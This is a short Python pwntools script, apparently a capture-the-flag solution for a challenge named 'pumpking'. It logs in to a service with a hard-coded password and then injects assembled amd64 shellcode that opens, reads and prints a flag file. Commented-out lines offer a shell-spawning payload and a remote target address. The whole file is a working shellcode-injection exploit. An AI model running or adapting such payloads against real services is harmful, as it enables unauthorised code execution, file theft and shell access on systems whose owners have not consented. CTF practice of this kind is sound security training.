from pwn import *

context.clear(arch='amd64', os='linux')

sh = shellcraft.openat(-1, '/home/ctf/flag.txt') # -1 = not relative
sh += shellcraft.read(5, 'rsp', 80)
sh += shellcraft.write(1, 'rsp', 80)
sh += shellcraft.exit(0)

print(sh)

# io = process('/home/barrett/Downloads/pwn_pumpking/challenge/pumpking')
io = remote('0.0.0.0', 1337)
# io = remote('167.71.137.174', 31444)

print(io.recv())
io.sendline(b'pumpk1ngRulez')
print(io.recv())

# payload = asm(shellcraft.cat(b'/home/ctf/flag.txt', 1)) # stdout
# payload = asm(shellcraft.sh())
payload =  asm(sh)

io.sendline(payload)
io.interactive()

